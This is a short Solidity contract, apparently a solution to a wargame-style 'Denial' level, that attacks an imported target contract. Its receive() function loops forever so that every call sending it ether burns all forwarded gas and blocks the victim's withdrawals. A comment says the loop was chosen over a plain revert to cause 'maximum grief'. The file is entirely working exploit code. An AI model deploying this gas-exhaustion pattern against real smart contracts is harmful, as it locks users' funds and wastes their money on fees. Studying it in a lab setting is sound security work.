// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
       // I could technically just do require(false), but if my
       // objective is to cause maximum grief, I think making the
       // victim spend all potential gas is more evil 😈
       while(true) {}
    }
}
